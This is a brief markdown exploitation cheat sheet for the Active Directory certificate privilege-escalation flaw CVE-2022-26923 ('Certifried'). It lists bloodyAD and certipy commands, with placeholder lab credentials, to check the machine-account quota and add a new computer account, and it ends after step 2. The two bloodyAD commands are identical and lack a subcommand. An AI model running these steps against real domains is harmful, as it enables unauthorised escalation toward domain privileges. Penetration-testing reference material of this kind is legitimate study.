# Certifried CVE-2022-26923

### An authenticated user could manipulate attributes on computer accounts they own or manage, and acquire a certificate from Active Directory Certificate Services that would allow elevation of privilege.

#### 1) Find ms-DS-MachineAccountQuota

 - python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10

#### 2) Add a new computer in the Active Directory, by default MachineAccountQuota = 10

 - python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10

 - certipy account create 'lab.local/username:Password123*@dc.lab.local' -user 'cve'
